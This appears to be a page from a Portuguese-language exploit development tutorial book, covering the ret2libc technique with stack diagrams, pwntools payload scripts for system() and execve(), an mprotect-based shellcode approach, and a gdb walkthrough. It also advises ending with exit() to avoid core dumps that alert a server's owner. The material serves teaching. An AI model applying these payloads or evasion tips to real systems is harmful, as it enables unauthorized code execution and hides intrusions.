@@ -1,0 +1,631 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Ret2LibC - Um Livrinho Sobre Exploit Dev</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><strong>3.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>3.1.</strong> Brainpan</li><li><strong>3.2.</strong> Tib3rius BOF Prep</li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><strong>5.</strong> from pwn import *</li><li><a href="./stack/ret2/ret2libc.html" class="active"><strong>6.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>6.1.</strong> Protostar Stack Six: ret2libc</li><li><strong>6.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>7.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>8.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>8.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>8.1.1.</strong> ROPE</a></li></ul></li><li><strong>8.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>8.2.1.</strong> ROPE: pivot</a></li></ul></li><li><strong>8.3.</strong> ROP + ret2libc desconhecido</li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>9.</strong> SROP</a></li><li><strong>10.</strong> Derrotando ASLR</li><li><ul class="section"><li><a href="./stack/ret2/ret2plt.html"><strong>10.1.</strong> ret2plt</a></li><li><ul class="section"><li><strong>10.1.1.</strong> extra: outros leaks</li></ul></li><li><strong>10.2.</strong> Bruteforce (32bit)</li></ul></li><li><strong>11.</strong> Derrotando PIE</li><li><strong>12.</strong> Derrotando Canaries</li><li class="spacer"></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Básico</li><li><ul class="section"><li><strong>14.1.</strong> Fastbins Dup</li><li><a href="./heap/basico/HouseOfForce.html"><strong>14.2.</strong> House of Force</a></li><li><strong>14.3.</strong> Unsafe Unlink</li><li><strong>14.4.</strong> Safe Unlink</li><li><strong>14.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>14.6.</strong> Chunk Faking</li></ul></li><li><strong>15.</strong> Intermediário</li><li><ul class="section"><li><strong>15.1.</strong> House of Orange</li><li><ul class="section"><li><strong>15.1.1.</strong> Heap Extension</li><li><strong>15.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>15.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>15.2.</strong> House of Spirit</li></ul></li><li><strong>16.</strong> Avançado</li><li><ul class="section"><li><strong>16.1.</strong> House of Rust</li><li class="spacer"></li></ul></li><li><strong>17.</strong> Intro AFL</li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <ul>
+<li><a href="./stack/ret2/ret2libc.html#ret2libc">Ret2LibC</a></li>
+<li><a href="./stack/ret2/ret2libc.html#fun%C3%A7%C3%B5es-%C3%BAteis">Funções Úteis</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#system">System()</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
+<li><a href="./stack/ret2/ret2libc.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
+<li><a href="./stack/ret2/ret2libc.html#unindo-tudo">Unindo tudo</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="./stack/ret2/ret2libc.html#pontos-fracos">Pontos Fracos</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#estaticamente-linkado">Estaticamente Linkado</a></li>
+<li><a href="./stack/ret2/ret2libc.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
+</ul>
+</li>
+<li><a href="./stack/ret2/ret2libc.html#fun%C3%A7%C3%B5es-uteis-pt-2">Funções Uteis Pt 2</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#execve--exit">Execve() + Exit()</a></li>
+<li><a href="./stack/ret2/ret2libc.html#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#argumentos">Argumentos</a>
+<ul>
+<li><a href="./stack/ret2/ret2libc.html#addr">Addr</a></li>
+<li><a href="./stack/ret2/ret2libc.html#size">Size</a></li>
+<li><a href="./stack/ret2/ret2libc.html#perms">Perms</a></li>
+</ul>
+</li>
+<li><a href="./stack/ret2/ret2libc.html#classifica%C3%A7%C3%A3o">Classificação</a></li>
+<li><a href="./stack/ret2/ret2libc.html#analise">Analise</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<a class="header" href="./stack/ret2/ret2libc.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
+<p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso,
+ter domínio dessa técnica facilitar a compreensão de ROP. :D</p>
+<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
+encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
+encontrar uma parte executável na memoria! Uma função do próprio programa!</p>
+<p>Voce se lembra de quando chamávamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
+iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma
+função pre-pronta pra nos dar uma shell :(</p>
+<p>Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#funções-Úteis" id="funções-Úteis"><h1>Funções Úteis</h1></a>
+<a class="header" href="./stack/ret2/ret2libc.html#system" id="system"><h2>System()</h2></a>
+<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
+<p>Para nosso propósito, ela recebe 1 argumento, o caminho do programa para
+executar (Ex: <code>/bin/sh</code>)</p>
+<p>Em C:</p>
+<pre><code class="language-C">#include &lt;stdlib.h&gt;
+int main() {
+    system(&quot;/bin/ls&quot;);
+    return 0;
+}
+</code></pre>
+<p>Em assembly:</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;/bin/ls&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edi, OFFSET FLAT:.LC0
+        call    System
+        mov     eax, 0
+        pop     rbp
+        ret
+</code></pre>
+<p>A função recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
+argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
+bits!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
+<p>Usando pwntools:</p>
+<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
+</code></pre>
+<p>x sera um pointer contendo o endereço da string <code>/bin/sh</code></p>
+<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
+<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
+Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
+<pre><code class="language-x86asm">    Func_1
+ ____________
+|            |
+|    RBP     | 
+|____________| 
+ ____________
+|            |
+|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
+|____________|      Porem, nao costumamos pensar o que acontece depois!
+ ____________
+|            |      Um ret simplesmente significa:
+|   ARG_1    |         pop RIP
+|____________|         jmp RIP
+ ____________           
+|            |      E como em qualquer pop, RSP se movimenta
+|   ARG_2    |
+|____________| 
+
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
+|____________|   Então da perspectiva de System,   |____________|
+ ____________           ARG_1 vira RIP              ____________       
+|            |          ARG_2 vira ARG_1           |            |
+|    RIP     |   ____                              |            |
+|____________|       |                             |____________|
+ ____________        |                              ____________
+|            |       V                             |            |  
+|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|   ARG_2    |                                     |   ARG_1    |
+|____________|                                     |____________|
+
+
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
+|____________|                                     |____________|
+ ____________                                       ____________       
+|            |    E nos controlamos a stack :D     |            |
+|  SYSTEM()  |    Então podemos passar os args     |            |
+|____________|    e o RIP de retorno para System   |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
+|____________|                                     |____________|
+
+                  System (ou qualquer outra 
+                  função que voce chamar) 
+                  vai executar /bin/sh e 
+                  tentar retornar para DDDDDDDD
+
+</code></pre>
+<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
+<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
+<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
+(<code>fork</code>, gerando um processo secundário: <code>child_proc</code>)!</p>
+<p>Então retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
+reportado para o processo principal e nao para o computador!</p>
+<blockquote>
+<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
+</blockquote>
+<a class="header" href="./stack/ret2/ret2libc.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
+<p>Vamos supor que o programa esta vulnerável a um BoF tradicional na função
+<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
+<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40            # Padding
+payload += p32(libc.sym.system) # RIP salvo batata()
+payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
+</code></pre>
+<p>Caso voce esteja com pressa, adios!</p>
+<p>Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens
+e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
+ROP!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
+<a class="header" href="./stack/ret2/ret2libc.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
+<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
+fração das funções presentes, pois somente as que sao originalmente usadas
+pelo programa sao linkadas!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
+<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
+potencial do libc. Porem caso o computador possua ASLR ligado, sera
+necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou
+executar o exploit em loop ate voce dar sorte (viável somente em
+computadores 32 bits).</p>
+<a class="header" href="./stack/ret2/ret2libc.html#funções-uteis-pt-2" id="funções-uteis-pt-2"><h1>Funções Uteis Pt 2</h1></a>
+<a class="header" href="./stack/ret2/ret2libc.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
+<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
+<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
+funciona igual <code>System</code>, porem com uma diferença: <code>System</code> cria um novo
+processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
+<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
+<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
+simplesmente chamar ele, quando voce fechar a shell vai gerar uma
+<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
+<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
+ativando mecanismos de segurança que alertam o dono do servidor!</p>
+<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
+programa finalize silenciosamente!</p>
+<p>Alem disso, existe mais uma diferença, <code>execve</code> recebe 3 argumentos:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  execve(&quot;./blablabla&quot;, NULL, NULL);
+  return 1;
+}
+</code></pre>
+<p>O primeiro: programa a ser executado</p>
+<p>O segundo: argv (poderíamos passar <code>-p</code> para <code>sh</code> manter os privilégios)</p>
+<p>O terceiro: envp (environment vars)</p>
+<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
+<p>Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edx, 0                ; envp
+        mov     esi, 0                ; argv
+        mov     edi, OFFSET FLAT:.LC0 ; programa
+        call    execve
+        mov     eax, 1
+        pop     rbp
+        ret
+</code></pre>
+<p>Caso voce queira usar argv:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, NULL);
+  return 1;
+}
+</code></pre>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 32
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        lea     rax, [rbp-32]
+        mov     edx, 0
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC2
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
+<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, envp);
+  return 1;
+}}
+</code></pre>
+<pre><code class="language-x86asm">..LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;env1&quot;
+.LC3:
+        .string &quot;env2&quot;
+.LC4:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 64
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
+        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
+        mov     QWORD PTR [rbp-48], 0
+        lea     rdx, [rbp-64]
+        lea     rax, [rbp-32]
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC4
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:</p>
+<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40                              # Padding
+payload += p32(libc.sym.execve)                   # RIP salvo batata()
+payload += p32(libc.sym.exit)                     # RIP salvo execve()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
+payload += p32(0)                                 # argv execve()
+payload += p32(0)                                 # envp execve()
+</code></pre>
+<p>Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!</p>
+<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiça hehehe :/</p>
+<blockquote>
+<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima técnica (<code>mprotect</code>)
+sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
+</blockquote>
+<a class="header" href="./stack/ret2/ret2libc.html#mprotect--ret2shellcode" id="mprotect--ret2shellcode"><h2>Mprotect() + ret2shellcode</h2></a>
+<p><code>Mprotect</code> pode ser usado para tornar uma região da memoria <code>RWX</code> novamente!</p>
+<p>A funcao recebe 3 argumentos: mprotect(addr, size, perms)</p>
+<p>Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da
+direita pra esquerda!</p>
+<pre><code>mprotect
+ret       -&gt; shellcode
+addr
+size
+perms
+</code></pre>
+<a class="header" href="./stack/ret2/ret2libc.html#argumentos" id="argumentos"><h3>Argumentos</h3></a>
+<a class="header" href="./stack/ret2/ret2libc.html#addr" id="addr"><h4>Addr</h4></a>
+<p>O endereço deve ser alinhado ao page_size, assim podemos fazer:</p>
+<pre><code class="language-py">((addr &gt;&gt; 4*n) &lt;&lt; 4*n)
+</code></pre>
+<p>Alinhando o endereço fazendo shift-direita shift-esquerda, 4 por digito hex!</p>
+<pre><code class="language-py">&gt;&gt;&gt; hex((0x7ffe23668bf4 &gt;&gt; 12) &lt;&lt; 12 )
+'0x7ffe23668000'
+</code></pre>
+<a class="header" href="./stack/ret2/ret2libc.html#size" id="size"><h4>Size</h4></a>
+<p>O valor deve ser multiplo de page_size, exemplo:
+0x1000 em x86_64</p>
+<p>Para encontrar esse valor na arquitetura que voce esta usando, basta ler o
+manual (opção chata e 0% descolada) ou usar <code>page_size = getpagesize ();</code> em C</p>
+<a class="header" href="./stack/ret2/ret2libc.html#perms" id="perms"><h4>Perms</h4></a>
+<p>As permissões sao: <code>PERM_READ, PERM_WRITE,... etcetc</code></p>
+<blockquote>
+<p>OBS: existem outras permissões relacionadas a memoria privada vs compartilhada etc</p>
+</blockquote>
+<p>Porem, essas sao somente macros de valor substituídas por <code>ints</code></p>
+<blockquote>
+<p>read=1 write=2 exec=4</p>
+</blockquote>
+<p>Assim, para termos todas as permissões, o valor de perms deve ser <code>7</code>!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#classificação" id="classificação"><h3>Classificação</h3></a>
+<p>Esses tipo de exploit se classifica como: exploit de múltiplas etapas</p>
+<p>Assim, tornando a região do nosso shellcode executável, e somente depois
+pulando para ele!
+Esses exploits vem se tornando mais e mais comuns conforme novas proteções
+sao adicionadas!</p>
+<a class="header" href="./stack/ret2/ret2libc.html#analise" id="analise"><h3>Analise</h3></a>
+<p>Porem, essa técnica sera usada predominantemente em SROP 64 bits !</p>
+<p>Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!</p>
+<p>Eu recomendo que voce pegue o exemplo em <code>man mprotect</code> e brinque com ele +
+<code>strace --trace=mprotect</code> para criar uma intuição!</p>
+<p>Eu alterei o meu para ficar assim:</p>
+<pre><code class="language-C">#include &lt;fcntl.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+static int alloc_size;
+static char* memory;
+
+// gcc c.c -o c
+
+void segv_handler (int signal_number) 
+{
+ printf (&quot;memory accessed!\n&quot;);
+ mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
+} 
+
+void foo() {
+ mprotect (memory, alloc_size, 2);
+}
+
+int main ()
+{
+ int fd;
+ struct sigaction sa;
+
+ /* Install segv_handler as the handler for SIGSEGV. */
+ memset (&amp;sa, 0, sizeof (sa));
+ sa.sa_handler = &amp;segv_handler;
+ sigaction (SIGSEGV, &amp;sa, NULL);
+ 
+ /* Allocate one page of memory by mapping /dev/zero. Map the memory
+   as write-only, initially. */
+ alloc_size = getpagesize ();
+ fd = open (&quot;/dev/zero&quot;, O_RDONLY);
+ memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
+ close (fd);
+
+ /* Write to the page to obtain a private copy. */
+ memory[0] = 0;
+
+ foo();
+
+
+ /* Write to the allocated memory region. */
+ memory[0] = 1;
+
+ /* All done; unmap the memory. */
+ printf (&quot;all done\n&quot;);
+ munmap (memory, alloc_size);
+ return 0;
+}
+</code></pre>
+<p>Eu coloquei a funcao dentro do <code>foo()</code>, caso o gcc esteja colocando ela inline,
+vale a pena checar as flags de otimização!</p>
+<p>A funcao fica:</p>
+<pre><code class="language-x86asm">   0x00005555555552a7 &lt;+0&gt;:	endbr64 
+   0x00005555555552ab &lt;+4&gt;:	push   rbp
+   0x00005555555552ac &lt;+5&gt;:	mov    rbp,rsp
+   0x00005555555552af &lt;+8&gt;:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
+   
+b  0x00005555555552b5 &lt;+14&gt;:	movsxd rcx,eax
+   
+b  0x00005555555552b8 &lt;+17&gt;:	mov    rax,QWORD PTR [rip+0x2d61]  # memory
+
+b  0x00005555555552bf &lt;+24&gt;:	mov    edx,0x2
+
+   0x00005555555552c4 &lt;+29&gt;:	mov    rsi,rcx
+   0x00005555555552c7 &lt;+32&gt;:	mov    rdi,rax
+
+b  0x00005555555552ca &lt;+35&gt;:	call   0x555555555150 &lt;mprotect@plt&gt;
+
+   0x00005555555552cf &lt;+40&gt;:	nop
+   0x00005555555552d0 &lt;+41&gt;:	pop    rbp
+   0x00005555555552d1 &lt;+42&gt;:	ret  
+</code></pre>
+<p><code>b</code> sao os breakpoints</p>
+<p>Em seguida, crie o seguinte gdbscript</p>
+<pre><code>disassemble foo
+
+b *foo+14
+b *foo+17
+b *foo+24
+b *foo+35
+
+r
+info registers $eax
+c
+info registers $eax $rcx
+c
+info registers $rax
+c
+info registers $edx $rsi $rcx $rdi $rax
+</code></pre>
+<p>Assim, temos uma visão de todos os registers afetados na funcao! E fica mais
+fácil de brincar com o programa, ver o que causa erro, etcetc....</p>
+<pre><code class="language-x86asm">Efetivamente, a funcao recebe:
+edx = flags
+rsi = page size
+rdi = addr
+
+Breakpoint 4, 0x00005555555552ca in foo ()
+edx            0x2                 2
+rsi            0x1000              4096
+rdi            0x7ffff7fc7000      140737353904128
+</code></pre>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="./stack/mitigacoes.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="./stack/gotplt.html" class="mobile-nav-chapters next" title="Next chapter">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+
+            </div>
+
+            
+                <a href="./stack/mitigacoes.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+                <a href="./stack/gotplt.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+    <script type="text/javascript">
+        var socket = new WebSocket("ws://localhost:3001");
+        socket.onmessage = function (event) {
+            if (event.data === "reload") {
+                socket.close();
+                location.reload(true); // force reload from server (not from cache)
+            }
+        };
+
+        window.onbeforeunload = function() {
+            socket.close();
+        }
+    </script>
+
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
